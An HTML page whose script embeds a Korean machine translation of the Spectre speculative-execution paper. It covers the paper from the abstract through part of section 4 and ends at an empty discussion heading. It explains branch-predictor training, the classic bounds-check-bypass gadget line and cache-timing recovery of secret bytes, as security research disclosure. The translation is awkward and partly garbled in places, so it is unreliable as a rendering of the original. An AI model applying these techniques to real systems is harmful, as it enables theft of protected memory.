<!DOCTYPE html>
<html lang="en" data-lt-installed="true"><head>
  <meta charset="UTF-8">
  <title>Title</title>
  <script>
    const text = '' +
      '# 스펙터 공격: 추측 실행+ 사용\n' +
      '각주 †: 여기 결과를 보고한 후, 우리는 우리의 작업이 구글의 프로젝트 제로에서 수행된 독립적인 작업의 결과와 부분적으로 겹친다는 것을 알게 되었다.\n' +
      '\n' +
      'Paul Kocher\\({}^{1}\\), Daniel Genkin\\({}^{2}\\), Daniel Gruss\\({}^{3}\\), Werner Haas\\({}^{4}\\), Mike Hamburg\\({}^{5}\\)\n' +
      '\n' +
      'Moritz Lipp\\({}^{3}\\), Stefan Mangard\\({}^{3}\\), Thomas Prescher\\({}^{4}\\), Michael Schwarz\\({}^{2}\\), Yuval Yarom\\({}^{6}\\)\n' +
      '\n' +
      '\\({}^{1}\\) _Independent_\n' +
      '\n' +
      '\\({}^{2}\\) _펜실베니아 대학교 및 메릴랜드 대학교_\n' +
      '\n' +
      '\\({}^{3}\\) _Graz University of Technology_\n' +
      '\n' +
      '\\({}^{4}\\) _Cyberus Technology__\n' +
      '\n' +
      '\\({}^{5}\\) _Rambus, 암호연구부\n' +
      '\n' +
      '\\({}^{6}\\) _애들레이드 대학교 및 Data61_\n' +
      '\n' +
      '###### Abstract\n' +
      '\n' +
      '최신 프로세서는 분기 예측 및 추측 실행을 사용하여 성능을 극대화합니다. 예를 들어, 분기의 목적지가 판독되는 과정에 있는 메모리 값에 의존하는 경우, CPU들은 목적지를 추측하고 전방을 실행하려고 시도할 것이다. 메모리 값이 마침내 도착하면 CPU는 투기 계산을 폐기하거나 커밋합니다. 추측 논리는 그것이 어떻게 실행되는지 불성실하고, 피해자의 기억과 레지스터에 접근할 수 있으며, 측정 가능한 부작용으로 연산을 수행할 수 있다.\n' +
      '\n' +
      '스펙터 공격은 피해자가 올바른 프로그램 실행 중에 발생하지 않을 동작을 추측적으로 수행하도록 유도하고, 부채널을 통해 피해자의 기밀 정보를 적에게 누설하는 것을 포함한다. 본 논문에서는 사이드 채널 공격, 오류 공격, 리턴 지향 프로그래밍의 방법론을 결합하여 희생자의 프로세스에서 임의의 메모리를 읽을 수 있는 실용적인 공격에 대해 설명한다. 더 광범위하게, 본 논문은 추측 실행 구현이 운영 체제 프로세스 분리, 정적 분석, 컨테이너화, JIT(Just-In-Time) 컴파일 및 캐시 타이밍/사이드 채널 공격에 대한 대응과 같은 수많은 소프트웨어 보안 메커니즘을 뒷받침하는 보안 가정을 위반한다는 것을 보여준다. 이러한 공격은 수십억 개의 장치에 사용되는 인텔, AMD 및 ARM의 마이크로프로세서에서 취약한 추측 실행 기능이 발견되기 때문에 실제 시스템에 심각한 위협을 나타낸다.\n' +
      '\n' +
      '일부 경우들에서 임시 프로세서-특정 대응법들이 가능하지만, 사운드 솔루션들은 하드웨어 아키텍처들 및 소프트웨어 개발자들에게 어떤 계산 상태 CPU 구현들이 누설되는 것이 허용되는지에 대한 공통의 이해를 제공하기 위해 프로세서 설계들에 대한 수정들뿐만 아니라 명령어 세트 아키텍처들(ISA)에 대한 업데이트들을 요구할 것이다.\n' +
      '\n' +
      '## 1 Introduction\n' +
      '\n' +
      '물리적 장치에 의해 수행되는 계산은 종종 계산의 명목 출력을 넘어 관찰 가능한 부작용을 남긴다. 부채널 공격은 안전하지 않은 비밀 정보를 추출하기 위해 이러한 부작용을 이용하는 데 중점을 둔다. 90년대 후반[25]에 도입된 이후, 전력 소비[23, 24], 전자기 복사[31], 또는 어쿠스틱 노이즈[17]와 같은 많은 물리적 효과들이 암호 키들뿐만 아니라 다른 비밀들을 추출하기 위해 활용되었다.\n' +
      '\n' +
      '물리적인 부채널 공격은 PC 및 휴대폰과 같은 복잡한 장치로부터 비밀 정보를 추출하기 위해 사용될 수 있지만[15, 16], 이러한 장치는 잠재적으로 알려지지 않은 출처로부터의 코드를 실행하기 때문에 외부 측정 장비가 필요하지 않은 추가 위협에 직면한다. 일부 소프트웨어 기반 공격은 소프트웨어 취약성(버퍼 오버플로 또는 사용 후 프리 취약성 등)을 악용하는 반면, 다른 소프트웨어 공격은 민감한 정보를 유출하기 위해 하드웨어 취약성을 활용합니다. 후자의 유형의 공격에는 캐시 타이밍[9, 30, 29, 35, 21, 36, 28], 분기 예측 이력[7, 6], 또는 분기 대상 버퍼[26, 11]를 악용하는 마이크로 아키텍처 공격이 포함됩니다. 또한, 물리적 메모리[22] 또는 내부 CPU 값[34]을 변경하는 결함 공격을 탑재하기 위해 소프트웨어 기반 기술이 사용되었다.\n' +
      '\n' +
      '추측 실행은 미래의 실행 경로를 추측하고 그 안에 있는 명령어를 조기에 실행함으로써 성능을 높이기 위해 고속 프로세서가 사용하는 기술이다. 예를 들어, 프로그램의 제어 흐름이 물리적 메모리에 위치된 캐시되지 않은 값에 의존하는 경우, 값이 알려지기 전에 수백 클록 사이클이 걸릴 수 있다. 프로세서는 아이들링에 의해 이들 사이클들을 낭비하기보다는, 제어 흐름의 방향을 추측하고, 그것의 레지스터 상태의 체크포인트를 저장하고, 추측된 경로 상에서 프로그램을 추측적으로 실행하도록 진행한다. 그 값이 결국 메모리로부터 도착할 때, 프로세서는 그것의 초기 추측의 정확성을 확인한다. 추측이 잘못되었다면, 프로세서는 레지스터 상태를 저장된 체크포인트로 다시 되돌림으로써 (잘못된) 추측 실행을 폐기하고, 그 결과 아이들링에 필적하는 성능을 초래한다. 그러나 추측이 정확할 경우, 추측 실행 결과가 커밋되어 지연 중에 유용한 작업이 수행됨에 따라 상당한 성능 이득을 얻는다.\n' +
      '\n' +
      '보안 관점에서 추측 실행은 잘못된 방법으로 프로그램을 실행하는 것을 포함한다. 그러나 프로세서가 올바른 상태를 유지하기 위해 이전 상태에 대한 잘못된 추측 실행 결과를 되돌리도록 설계되었기 때문에 이러한 오류는 이전에 보안에 영향을 미치지 않는 것으로 가정되었다.\n' +
      '\n' +
      '### Our Results\n' +
      '\n' +
      '본 논문에서는 스펙터 공격이라 불리는 새로운 종류의 마이크로아키텍쳐 공격을 소개한다. 높은 레벨에서 스펙터 공격은 프로세서를 속여서 올바른 프로그램 실행 중에 실행되지 말았어야 하는 명령어 시퀀스를 추측적으로 실행시킨다. 명목 CPU 상태에 대 한 이러한 명령의 영향은 결국 되돌아가므로 _일시적 명령_ 이라고 합니다. 어떤 일시적 명령어가 추측적으로 실행되는지 신중하게 선택함으로써, 우리는 피해자의 메모리 주소 공간 내에서 정보를 유출할 수 있다.\n' +
      '\n' +
      '보안 도메인에서 정보를 유출하기 위해 일시적인 명령어 시퀀스를 사용하여 스펙터 공격의 가능성을 경험적으로 증명한다.\n' +
      '\n' +
      '네이티브 코드를 이용한 공격.우리는 메모리 접근 공간 내에 비밀 데이터를 포함하는 간단한 희생 프로그램을 만들었다. 다음으로, 희생 프로그램을 컴파일한 후 희생자의 주소 공간에서 정보를 유출하는 데 사용할 수 있는 명령어 시퀀스에 대해 결과 바이너리와 운영 체제의 공유 라이브러리를 검색했다. 마지막으로, 이전에 발견된 시퀀스를 일시적인 명령어로 실행하기 위해 CPU의 추측 실행 기능을 활용하는 공격자 프로그램을 작성했다. 이 기술을 이용해서 피해자의 기억 주소 공간 전체를 읽을 수 있었어요 그 안에 저장된 비밀도 포함해서요\n' +
      '\n' +
      'JavaScript를 사용 하 여 공격 합니다. 네이티브 코드를 사용 하 여 프로세스 격리 경계를 위반 하는 것 외에도 Spectre 공격을 사용 하 여 휴대용 JavaScript 코드를 사용 하 여 브라우저 샌드 박싱을 위반 할 수도 있습니다. 우리는 그것을 실행하는 브라우저 프로세스의 주소 공간에서 데이터를 성공적으로 읽는 자바스크립트 프로그램을 작성했다.\n' +
      '\n' +
      '### Our Techniques\n' +
      '\n' +
      '높은 수준에서 스펙터 공격은 추측 실행과 미세 구조 비밀 채널을 통한 데이터 반출을 결합하여 메모리 격리 경계를 위반한다. 보다 구체적으로, Spectre 공격을 탑재하기 위해, 공격자는 실행될 때 희생자의 메모리 또는 레지스터 콘텐츠를 누설하는 은밀한 채널 송신기로서 작용하는 프로세스 어드레스 공간 내에 명령어들의 시퀀스를 위치시킴으로써 시작한다. 공격자는 그런 다음 CPU를 이 명령어 시퀀스를 추측적이고 잘못 실행하도록 트릭하여 비밀 채널을 통해 피해자의 정보를 누설한다. 마지막으로, 공격자는 은밀한 채널을 통해 피해자의 정보를 검색한다. 이러한 잘못된 추측 실행으로 인한 공칭 CPU 상태로의 변경은 결국 되돌아가는 반면, CPU의 다른 마이크로아키텍처 부분(캐시 콘텐츠와 같은)으로의 변경은 공칭 상태 복귀에서 살아남을 수 있다.\n' +
      '\n' +
      '스펙터 공격에 대한 위의 설명은 일반적이며, 마이크로 아키텍처 은밀한 채널뿐만 아니라 잘못된 추측 실행을 유도하는 방법으로 구체적으로 인스턴스화될 필요가 있다. 은닉 채널 컴포넌트에 대해 많은 선택들이 가능하지만, 본 작업에서 설명된 구현들은 Flush+Reload[37] 또는 Evict+Reload[28] 기법들을 사용하는 캐시-기반 은닉 채널을 사용한다.\n' +
      '\n' +
      '이제 잘못된 추측 실행을 유도하고 영향을 미치는 기술을 설명한다.\n' +
      '\n' +
      '조건부 분기(Conditional Branch)를 이용한다. 조건부 분기(Conditional Branch)를 이용하려면 분기 예측기(Branch predictor)가 분기 방향을 잘못 예측하도록 해야 하고, 프로세서는 그렇지 않으면 실행되지 않을 코드를 추측적으로 실행하여 공격자가 원하는 정보를 유출해야 한다. 다음은 악용 가능한 코드의 예입니다.\n' +
      '\n' +
      'if(x < array1_size)y = array2[array1[x]*256];\n' +
      '\n' +
      '이 예제에서 변수 x에는 공격자가 제어한 데이터가 포함되어 있습니다. 문이 분기 명령어로 컴파일되면 x 값이 법적 범위 내에 있는지 확인하는 것이 목적이며 array1에 대한 액세스가 유효한지 확인한다.\n' +
      '\n' +
      '공격의 경우 공격자는 먼저 유효한 입력으로 관련 코드를 호출하여 분기 예측 변수가 참일 것으로 예상하도록 훈련시킵니다. 그런 다음 공격자는 array1의 범위를 벗어났고 array1_size가 캐시되지 않은 x 값을 사용하여 코드를 호출합니다. CPU는 범위 검사가 참일 것이라고 추측하며, 악의적인 x를 사용하여 array2[array1[x] * 256]에서 읽기를 추측적으로 실행합니다. 어레이2로부터 판독된 데이터는 악의적인 x를 사용하여 어레이1[x]에 의존하는 어드레스에서 캐시에 데이터를 로딩한다. 캐시 상태의 변화는 프로세서가 추측 실행이 잘못되었음을 인식할 때 되돌리지 않으며, 공격자에 의해 탐지되어 희생자의 메모리의 바이트를 찾을 수 있다. x의 상이한 값으로 반복함으로써, 이 구성은 희생자의 기억을 판독하기 위해 이용될 수 있다.\n' +
      '\n' +
      'ROP(리턴 지향 프로그래밍)에서 간접 분기 활용 [33] 이 메서드에서 공격자는 희생자의 주소 공간에서 _gadget_ 을 선택 하 고 희생자가 가젯을 추측 하 여 실행 하도록 영향을 줍니다. 공격자는 ROP와 달리 공격 대상 코드의 취약성에 의존하지 않습니다. 대신 공격자는 분기 대상 버퍼 (BTB)를 학습 하 여 간접 분기 명령에서 가젯의 주소로 분기를 잘못 예측 하 여 가젯을 추측적으로 실행 합니다. 추측적으로 실행된 명령어는 포기되지만 캐시에 미치는 영향은 되돌아가지 않는다. 이러한 효과는 가젯이 민감한 정보를 유출하는 데 사용할 수 있습니다. 우리는 가젯을 신중하게 선택하면 이 방법이 희생자로부터 임의 기억을 읽는 데 어떻게 사용될 수 있는지 보여준다.\n' +
      '\n' +
      'BTB를 오인하기 위해 공격자는 피해자의 주소 공간에서 가젯의 가상 주소를 찾은 다음 이 주소로 간접 분기를 수행한다. 이 훈련은 공격자의 주소 공간에서 수행되며 공격자의 주소 공간에서 가젯 주소에 있는 것은 중요하지 않습니다. 필요한 모든 것은 분기 훈련에 사용되는 분기가 동일한 대상 가상 주소를 사용하는 것입니다. (실제로, 공격자가 예외를 처리하는 한, 공격자의 주소 공간에서 가젯의 가상 주소에 매핑된 코드가 없더라도 공격이 작동할 수 있다.) 또한, 훈련에 사용되는 분기의 소스 주소와 타겟된 분기의 주소가 완전히 일치할 필요가 없다. 따라서 공격자는 훈련 설정에 상당한 유연성을 가지고 있다.\n' +
      '\n' +
      '기타 Variants. 추가 공격은 추측 실행을 달성하는 방법과 정보를 유출하는 데 사용되는 방법을 모두 변경하여 설계할 수 있습니다. 전자의 예로는, 리턴 지시를 오인하거나 인터럽트로부터의 리턴을 들 수 있다. 후자의 예는 타이밍 변동을 통해 또는 연산 유닛에 대한 경쟁을 생성함으로써 정보를 누설하는 것을 포함한다.\n' +
      '\n' +
      '### 대상 하드웨어 및 현재 상태\n' +
      '\n' +
      '하드웨어.Ivy Bridge, Haswell, Skylake 기반 프로세서를 포함한 여러 인텔 프로세서의 Spectre 공격에 대한 취약성을 실증적으로 검증하였다. 또한 AMD Ryzen CPU에 대한 공격의 적용 가능성을 검증하였다. 마지막으로, 우리는 인기 있는 모바일 폰에서 발견되는 여러 삼성 및 퀄컴 프로세서(ARM 아키텍처를 사용함)에 Spectre 공격을 성공적으로 탑재했다.\n' +
      '\n' +
      '현재 상태 책임 있는 공개를 사용 하 여 결과의 예비 버전을 Intel, AMD, ARM, Qualcomm 및 기타 CPU 공급업체에 공개 했습니다. 우리는 또한 아마존, 애플, 마이크로소프트, 구글 등을 포함한 다른 회사들과 연락했다. 스펙터 계열의 공격은 CVE-2017-5753 및 CVE-2017-5715에 문서화되어 있다.\n' +
      '\n' +
      '### Meltdown\n' +
      '\n' +
      '멜트다운[27]은 표적의 물리적 기억을 유출하기 위해 비순차적 실행을 이용하는 관련 마이크로아키텍쳐 공격이다. 멜트다운은 크게 두 가지 측면에서 스펙터 공격과 구별된다. 먼저 스펙터와 달리 멜트다운은 투기적 실행을 달성하기 위해 분기 예측을 사용하지 않는다. 대신, 명령어가 트랩을 유발할 때 비순서적으로 실행된 다음 명령이 중단된다는 관찰에 의존한다. 둘째, Meltdown은 인텔 프로세서에 특화된 권한 상승 취약성을 이용하는데, 이는 추측적으로 실행된 명령어가 메모리 보호를 우회할 수 있기 때문이다. 이러한 문제를 결합하여 멜트다운은 사용자 공간에서 커널 메모리에 액세스합니다. 이러한 액세스는 트랩을 유발하지만, 트랩이 발행되기 전에, 액세스를 따르는 코드는 캐시 채널을 통해 액세스된 메모리의 내용을 누설한다.\n' +
      '\n' +
      'Meltdown과 달리 Spectre 공격은 AMD, ARM 프로세서를 포함한 비 인텔 프로세서에서 작동한다. 또한, 멜트다운 공격에 대한 완화로 널리 적용되고 있는 KAISER 패치 [19]는 스펙터로부터 보호하지 못한다.\n' +
      '\n' +
      '## 2 Background\n' +
      '\n' +
      '이 절에서는 최신 고속 프로세서의 미세 아키텍처 구성 요소 중 일부, 성능을 개선하는 방법, 실행 중인 프로그램에서 정보를 유출하는 방법에 대해 설명한다. 또한, ROP(return-oriented-programming) 및 \'gadgets\'에 대해 설명한다.\n' +
      '\n' +
      '### Out-of-order Execution\n' +
      '\n' +
      '명령어 _out-of-order_ 실행 패러다임은 명령어가 프로그램의 명령 스트림을 더 아래로 내려가서 이전 명령어와 병렬로, 때로는 이전 명령어와 함께 실행되도록 허용하여 프로세서의 구성 요소의 활용도를 높입니다.\n' +
      '\n' +
      '프로세서는 _재주문 버퍼_에서 완료 된 명령을 대기 합니다. 리오더 버퍼 내의 명령어들은 프로그램 실행 순서에서 _retired_이고, _i.e._는 모든 선행 명령어들이 완료되고 은퇴된 경우에만 명령어들이 은퇴된다.\n' +
      '\n' +
      '은퇴 시에만 퇴직한 지시의 결과가 커밋되고 외부로 드러나게 된다.\n' +
      '\n' +
      '### Speculative Execution\n' +
      '\n' +
      '종종, 프로세서는 프로그램의 향후 명령어 스트림을 알지 못한다. 예를 들어, 이것은 순서 외 실행이 아직 실행이 완료되지 않은 선행 명령어들에 의존하는 조건부 분기 명령어에 도달할 때 발생한다. 그러한 경우들에서, 프로세서는 자신의 현재 레지스터 상태를 포함하는 체크포인트를 저장하도록 할 수 있고, 프로그램이 따를 경로에 대한 예측을 행할 수 있고, _추측적으로_ 경로를 따라 명령어들을 실행할 수 있다. 예측이 정확한 것으로 판명되면, 체크포인트는 필요하지 않고 명령어들은 프로그램 실행 순서에서 은퇴된다. 그렇지 않으면 프로세서가 잘못된 경로를 따랐다고 결정하면 체크포인트에서 상태를 다시 로드하여 경로를 따라 보류 중인 모든 명령을 취소하고 올바른 경로를 따라 실행이 재개됩니다.\n' +
      '\n' +
      '프로그램 실행 경로 외부의 명령어들에 의해 이루어진 변경들이 프로그램에 보이도록 만들어지지 않도록 명령어들을 포기하는 것이 수행된다. 따라서, 추측 실행은 실행이 올바른 경로를 따랐던 것처럼 프로그램의 논리적 상태를 유지한다.\n' +
      '\n' +
      '### Branch Prediction\n' +
      '\n' +
      '추측적 실행은 프로세서가 분기 명령어의 가능성 있는 결과에 대해 추측할 것을 요구한다. 더 나은 예측은 성공적으로 커밋될 수 있는 추측적으로 실행된 동작의 수를 증가시킴으로써 성능을 향상시킨다.\n' +
      '\n' +
      '분기의 결과를 예측하기 위해 여러 프로세서 구성 요소가 사용된다. 분기 타겟 버퍼(BTB)는 최근에 실행된 분기 명령어들의 어드레스들로부터 목적지 어드레스들로의 맵핑을 유지한다[26]. 프로세서는 분기 명령어를 디코딩하기 전에도 BTB를 사용하여 미래의 코드 어드레스를 예측할 수 있다. Evtyushkin 등[11]은 인텔 Haswell 프로세서의 BTB를 분석하고 브랜치 어드레스의 30개의 최하위 비트들만이 BTB를 인덱싱하는데 사용된다는 결론을 내린다. 실험 결과 유사한 결과를 얻었지만 20비트만 요구되었다.\n' +
      '\n' +
      '조건부 브랜치의 경우, 타겟 어드레스를 기록하는 것은 브랜치의 결과를 예측하기에 충분하지 않다. 조건부 분기의 취출 여부를 예측하기 위해, 프로세서는 최근 분기 결과에 대한 기록을 유지한다. Bhattacharya et al. [10]은 최근 Intel 프로세서에서 분기 이력 예측의 구조를 분석한다.\n' +
      '\n' +
      '### Memory Hierarchy\n' +
      '\n' +
      '더 빠른 프로세서와 더 느린 메모리 사이의 속도 갭을 브리지하기 위해, 프로세서들은 연속적으로 더 작지만 더 빠른 캐시들의 계층을 사용한다. 캐시는 메모리를 _라인_ 이라고 하는 고정 크기 청크로 분할 하며, 일반적인 라인 크기는 64 또는 128 바이트입니다. 프로세서가 메모리의 데이터를 필요로 하는 경우 먼저 계층 구조의 맨 위에 있는 _L1_ 캐시에 복사본이 포함되어 있는지 확인합니다. * 캐시 히트* 의 경우 캐시에서 데이터를 찾을 때 L1 캐시에서 데이터를 검색 하 여 사용 합니다. 그렇지 않으면 _캐시 미스_ 에서 다음 캐시 수준에서 데이터를 검색 하는 절차가 반복 됩니다. 또한, 데이터는 가까운 미래에 다시 필요할 경우를 대비하여 L1 캐시에 저장된다. 현대의 인텔 프로세서는 일반적으로 세 개의 캐시 레벨을 가지며, 각각의 코어는 전용 L1 및 L2 캐시를 가지며 모든 코어는 LLC(Last-Level Cache)라고도 알려진 공통 L3 캐시를 공유한다.\n' +
      '\n' +
      '### Microarchitectural Side-Channel 공격\n' +
      '\n' +
      '위에서 논의한 모든 마이크로 아키텍처 구성 요소는 미래의 프로그램 동작을 예측하여 프로세서 성능을 향상시킨다. 이를 위해 과거 프로그램 행동에 의존하는 상태를 유지하고 미래 행동이 과거 행동과 유사하거나 관련이 있다고 가정한다.\n' +
      '\n' +
      '다수의 프로그램들이 동시에 또는 시간 공유를 통해 동일한 하드웨어 상에서 실행될 때, 하나의 프로그램의 동작에 의해 야기된 마이크로아키텍처 상태의 변화들은 다른 프로그램들에 영향을 미칠 수 있다. 이는 결국, 의도하지 않은 정보가 한 프로그램으로부터 다른 프로그램으로 유출되는 결과를 초래할 수 있다[13]. 과거 연구들은 BTB[26, 11], 분기 이력[7, 6], 캐시[29, 30, 35, 21]를 통해 정보를 유출하는 공격을 입증했다.\n' +
      '\n' +
      '본 연구에서는 민감한 정보를 유출하기 위해 Flush+Reload 기법[21, 36]과 그 변형인 Evict+Reload[20]을 사용한다. 이러한 기법들을 사용하여, 공격자는 희생자와 공유된 캐시 라인을 캐시로부터 제거함으로써 시작한다. 피해자가 잠시 실행한 후, 공격자는 퇴거된 캐시 라인에 대응하는 어드레스에서 메모리 판독을 수행하는 데 걸리는 시간을 측정한다. 피해자가 모니터링된 캐시 라인에 액세스했다면, 데이터는 캐시에 있을 것이고 액세스는 빠를 것이다. 그렇지 않으면 피해자가 회선에 액세스하지 않은 경우 읽기가 느려집니다. 따라서 공격자는 접근 시간을 측정하여 퇴거 단계와 탐색 단계 사이에 피해자가 모니터링된 캐시 라인에 접근했는지 여부를 학습한다.\n' +
      '\n' +
      '두 기법 사이의 주요 차이점은 캐시로부터 모니터링된 캐시 라인을 제거하기 위해 사용되는 메커니즘이다. 플러시+재로드 기법에서 공격자는 전용 컴퓨터 명령(예: x86의 플러시)을 사용하여 선을 제거합니다. Evict+Reload에서, 퇴거는 라인을 저장하는 캐시 세트 상의 경쟁을 강제함으로써 달성되는데, 예를 들어, 캐시 내로 매수되는 다른 메모리 위치들에 액세스함으로써 그리고 (캐시의 제한된 크기 때문에) 프로세서로 하여금 후속적으로 프로빙되는 라인을 퇴거하게 한다.\n' +
      '\n' +
      '### Return-Oriented Programming\n' +
      '\n' +
      'ROP(Return-Oriented Programming) [33]은 버퍼 오버플로우 취약점을 악용하는 기법이다. 이 기술은 취약한 피해자의 코드에서 발견되는_gadgets_라고 하는 기계 코드 조각들을 체인화함으로써 작동한다. 보다 구체적으로, 공격자는 먼저 피해자 바이너리에서 사용 가능한 가젯을 찾는다. 그런 다음 그녀는 버퍼 오버플로 취약성을 사용하여 가젯의 주소 시퀀스를 희생 프로그램 스택에 기록한다. 각 가젯은 반환 명령을 실행하기 전에 일부 계산을 수행합니다. 리턴 명령은 스택으로부터 리턴 어드레스를 가져오고, 공격자가 이 어드레스를 제어하기 때문에, 리턴 명령은 체인의 다음 가젯으로 효과적으로 점프한다.\n' +
      '\n' +
      '## 3 공격 개요\n' +
      '\n' +
      '스펙터 공격은 공격자가 올바른 프로그램 실행 중에 발생하지 않을 수 있고, 공격자에게 사이드 채널을 통해 피해자의 기밀 정보를 유출하는 동작을 추측적으로 수행하도록 유도한다. 먼저 조건부 분기 오예측을 활용하는 변종(섹션 4)을 설명하고 간접 분기 대상의 오예측을 활용하는 변종(섹션 5)을 설명한다.\n' +
      '\n' +
      '대부분의 경우 공격은 설정 단계에서 시작되며, 공격자는 프로세서가 나중에 악용할 수 있는 잘못된 추측 예측을 하도록 프로세서를 오제한 작업을 수행한다. 또한, 셋업 페이즈는 보통 프로세서가 분기 명령어의 목적지를 결정하는 데 필요한 값을 자신의 캐시로부터 축출하게 하는 타겟팅된 메모리 판독을 수행하는 것과 같이 추측 실행을 유도하는 것을 돕는 단계들을 포함한다. 설정 단계 동안, 공격자는 또한 예를 들어 플러시+재로드 또는 퇴거+재로드 공격의 플러시 또는 퇴거 부분을 수행함으로써 피해자의 정보를 추출하는데 사용될 사이드 채널을 준비할 수 있다.\n' +
      '\n' +
      '제2 단계 동안, 프로세서는 희생자 컨텍스트로부터 마이크로아키텍처 사이드 채널로 기밀 정보를 전달하는 명령어(들)를 추측적으로 실행한다. 이것은 공격자로 하여금 (예를 들어, 시스콜, 소켓, 파일 등을 통해) 액션을 수행하도록 요청하게 함으로써 트리거될 수 있다. 다른 경우들에서, 공격자는 동일한 프로세스로부터 민감한 정보를 획득하기 위해 (예를 들어, 공격 코드가 인터프리터, Just-in-time 컴파일러 또는 \'afe\' 언어에 의해 샌드박스화되고 액세스하지 않아야 하는 메모리를 판독하고자 하는 경우) 자신의 코드의 추측(오-실행)을 레버리지할 수 있다. 투기적 실행은 광범위한 부채널을 통해 민감한 데이터를 잠재적으로 노출시킬 수 있지만, 주어진 예는 투기적 실행을 유발하여 공격자가 선택한 주소에서 메모리 값을 읽은 다음 값을 노출하는 방식으로 캐시 상태를 수정하는 메모리 동작을 수행한다.\n' +
      '\n' +
      '최종 단계의 경우, 민감한 데이터가 복구된다. 플러시+재로드 또는 퇴거+재로드를 사용하는 Spectre 공격의 경우 복구 프로세스는 모니터링 중인 캐시 라인의 메모리 주소에서 읽기가 얼마나 오래 걸리는지 타이밍으로 구성된다.\n' +
      '\n' +
      '스펙터 공격은 추측적으로 실행된 명령어가 메모리로부터 판독될 수 있다고 가정할 뿐이며, 예를 들어 페이지 오류 또는 예외를 트리거하지 않고 피해자 프로세스가 정상적으로 액세스할 수 있다. 예를 들어, 프로세서가 사용자 프로세스들에서 명령들의 추측적인 실행이 커널 메모리에 액세스하는 것을 방지한다면, 공격은 여전히 작동할 것이다. [12]. 그 결과, Spectre는 Meltdown[27]과 직교하며, 이는 일부 CPU가 사용자 명령어의 순서를 벗어난 실행을 허용하여 커널 메모리를 읽는 시나리오를 이용한다.\n' +
      '\n' +
      '## 4 조건부 분기 예측 사용\n' +
      '\n' +
      '목록 1의 코드가 신뢰할 수 없는 원본에서 서명되지 않은 정수 x를 수신하는 함수(예: 커널 syscall 또는 암호 라이브러리)의 일부인 경우를 고려합니다. 코드를 실행하는 프로세스는 크기 array1_size의 부호 없는 바이트 어레이1의 어레이, 및 크기 64KB의 제2 바이트 어레이 어레이2에 대한 액세스를 갖는다.\n' +
      '\n' +
      '```\n' +
      'if(x<array1_size) y=array2[array1[x]*256];\n' +
      '```\n' +
      '\n' +
      '목록 1: 조건부 분기 예제\n' +
      '\n' +
      '코드 조각은 보안에 필수적인 x에 대한 경계 검사로 시작한다. 특히, 이 검사는 프로세서가 어레이1의 외부에서 민감한 메모리를 판독하는 것을 방지한다. 그렇지 않으면, 아웃바운드 입력 x는 예외를 트리거할 수 있거나, 프로세서로 하여금 x(=\\)(읽을 비밀 바이트의 어드레스) \\(-\\)(어레이1의 기본 어드레스)를 공급함으로써 민감한 메모리에 액세스하게 할 수 있다.\n' +
      '\n' +
      '불행히도 추측 실행 중에 경계 검사에 대한 조건부 분기가 잘못된 경로를 따를 수 있습니다. 예를 들어, 상대방이 다음과 같이 코드를 실행하게 한다고 가정하자:\n' +
      '\n' +
      '* x의 값은 어레이1[x]가 피해자의 메모리 어딘가의 비밀 바이트 \\(k\\)로 해결되도록 악의적으로 선택(및 아웃-오프-바운드)되고;\n' +
      '* array1_size 및 array2는 프로세서의 캐시에 존재하지 않지만, \\(k\\)은 캐싱되고; 그리고\n' +
      '* 이전 작업은 유효한 x 값을 수신하여 분기 예측기가 참일 가능성이 있는 경우를 가정하도록 유도합니다.\n' +
      '\n' +
      '이러한 캐시 구성은 자연적으로 발생할 수 있거나, 또는 예를 들어, 적은 양의 메모리를 단순히 판독하여 캐시를 관련 없는 값들로 채운 다음, 커널이 정당한 동작에서 비밀 키를 사용하도록 함으로써, 적대자에 의해 생성될 수 있다. 캐시 구조가 알려진 경우[38] 또는 CPU가 캐시 플러시 명령(예를 들어, x86 clflush 명령)을 제공하는 경우, 캐시 상태는 훨씬 더 효율적으로 달성될 수 있다.\n' +
      '\n' +
      '상기 컴파일된 코드가 실행될 때, 프로세서는 array1_size에 대해 x의 악의적인 값을 비교함으로써 시작한다. 어레이1_사이즈를 판독하는 것은 캐시 미스를 초래하고, 프로세서는 그 값이 DRAM으로부터 이용가능할 때까지 실질적인 지연에 직면한다. 이 대기 동안, 분기 예측기는 if가 참일 것이라고 가정하며, 추측 실행 로직은 어레이1의 베이스 어드레스에 x를 추가하고 메모리 서브시스템으로부터 결과 어드레스에서의 데이터를 요청한다. 이 읽기는 캐시 히트로, 비밀 바이트 값 \\(k\\)을 빠르게 반환합니다. 그런 다음 추측 실행 로직은 \\(k\\)을 사용하여 array2[\\(k\\) * 256]의 주소를 계산한 다음, 메모리에서 이 주소를 읽기 위한 요청을 보냅니다 (다른 캐시 누락으로 인해). array2로부터의 판독이 보류되는 동안, array1_size의 값은 최종적으로 DRAM으로부터 도달한다. 프로세서는 그것의 추측적 실행이 잘못되었음을 깨닫고, 그것의 레지스터 상태를 되감는다. 그러나, 실제 프로세서들에서, 어레이2로부터의 추측 판독은 어드레스-특정 방식으로 캐시 상태에 영향을 미치며, 여기서 어드레스는 \\(k\\)에 의존한다.\n' +
      '\n' +
      '공격을 완료하기 위해, 공격자는 비밀 바이트 \\(k\\)을 복구하기 위해 캐시 상태의 변화를 탐지하기만 하면 된다. 배열2에 대 한 다음 읽기는 \\(n\\)=\\(k\\)에 대해 빠르고 다른 모든 \\(n\\in 0..255\\)에 대해 느리기 때문에 공격자가 array2를 읽을 수 있는 경우 쉽습니다. 그렇지 않으면, 프라임-앤-프로브 공격[29]은 array2로부터의 판독에 의해 야기된 퇴거를 검출함으로써 \\(k\\)을 추론할 수 있다. 대안적으로, 적대자는 즉시 인-바운드 값 x\'로 타겟 함수를 다시 호출하고 두 번째 호출이 얼마나 걸리는지를 측정할 수 있다. array1[x\']이 \\(k\\)과 같다면, array2에서 액세스된 위치는 캐시에 있을 것이고 연산은 array1[x\']보다 더 빠른 경향이 있을 것이다. \\ (=k\\) 이것은 반복적으로 호출될 때, 원하는 대로 메모리 바이트들에 대해 해결할 수 있는 메모리 비교 동작을 산출한다. 또 다른 변형은 어레이2[\\(k\\)*256]가 캐시되었는지 여부에 따라 투기 실행의 성능이 변경되기 때문에 투기 실행에 들어가는 캐시 상태를 활용하며, 이는 후속 투기 실행 명령으로부터의 측정 가능한 효과에 기초하여 추론될 수 있다.\n' +
      '\n' +
      '### Discussion\n' +
      '\n' +
